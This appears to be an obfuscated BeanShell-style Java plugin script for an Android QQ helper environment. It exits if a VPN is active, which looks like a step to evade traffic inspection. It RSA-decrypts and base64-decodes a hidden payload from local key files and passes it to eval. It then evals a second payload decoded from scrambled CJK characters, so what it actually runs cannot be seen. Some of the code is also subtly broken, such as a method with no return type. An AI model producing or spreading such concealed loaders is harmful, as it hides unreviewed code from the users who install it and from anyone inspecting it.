import java.security.*;import java.security.spec.*;import java.security.interfaces.*;import javax.crypto.spec.*;import javax.crypto.interfaces.*;import java.io.*;import java.math.*;import sun.misc.BASE64Decoder;import sun.misc.BASE64Encoder;import android.net.ConnectivityManager; import java.lang.reflect.Field;import android.app.ActivityManager;import com.bug.utils.FieldUtils;import android.app.Application;import android.content.Context;import android.app.Activity;Activity ThisActivity = null;public void initActivity(){ThisActivity = GetActivity();}public boolean isTopActivity(String packageName){ActivityManager __am = (ActivityManager) context.getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);List __list = __am.getRunningAppProcesses();if(__list.size() == 0) return false;for(ActivityManager.RunningAppProcessInfo __process: __list){if(__process.importance == ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND && __process.processName.equals(packageName)){return true;}}return false;}private boolean checkV(){ConnectivityManager cm = (ConnectivityManager) ThisActivity.getSystemService(Context.CONNECTIVITY_SERVICE);return cm.getNetworkInfo(ConnectivityManager.TYPE_VPN).isConnectedOrConnecting();}initActivity();if(isTopActivity("com.tencent.mobileqq")){if(ThisActivity != null){if(checkV()){return;}}}public String get(String url){StringBuffer buffer = new StringBuffer();InputStreamReader isr = null;try {URL urlObj = new URL(url);URLConnection uc = urlObj.openConnection();uc.setConnectTimeout(10000);uc.setReadTimeout(10000);isr = new InputStreamReader(uc.getInputStream(), "utf-8");BufferedReader reader = new BufferedReader(isr);String line;while ((line = reader.readLine()) != null) {buffer.append(line + "\n");}} catch (Exception e) {e.printStackTrace();} finally {try {if (null != isr) {isr.close();}} catch (IOException e) {e.printStackTrace();}}if(buffer.length()==0)return buffer.toString();buffer.delete(buffer.length()-1,buffer.length());return buffer.toString();}public static Jls(String Code)   {byte[] bt = (new BASE64Decoder()).decodeBuffer(Code); String key=new String(bt);  return key;}BufferedReader in =new BufferedReader(new InputStreamReader(new FileInputStream(AppPath+"/天歌目录/Key/m.java")));String ctext = in.readLine();BigInteger c = new BigInteger(ctext);FileInputStream f = new FileInputStream(AppPath+"/天歌目录/Key/m.bat");ObjectInputStream b = new ObjectInputStream(f);RSAPrivateKey prk = (RSAPrivateKey) b.readObject();BigInteger d = prk.getPrivateExponent();BigInteger n = prk.getModulus();BigInteger m = c.modPow(d, n);byte[] mt = m.toByteArray();String a ="";for (int i = 0; i < mt.length; i++) {System.out.print((char) mt[i]);a=a+(char) mt[i];}this.interpreter.eval(Jls(a),"eval stream");this.interpreter.eval(歌("妝妑妒妜套妒妗妝妎妛妙妛妎妝妎妛套妎妟妊妕契妐妎妝契奋妑妝妝妙奣奘奘妠妝妐套妙妠奘妝妐妗奘奎奮奞奎奪奝奎奪奢奎奮奟奎奪奭奎奡奬奎奮奠奎奢奫奎奪奮奎奮奞奎奫奭奎奢奞死殹殭段殺死殏殻殾殱死殑殺殯歺殼殴殼歮歵歸歮殱毂殭殸歬殿毀殾殱殭殹歮歵殇"),"eval stream");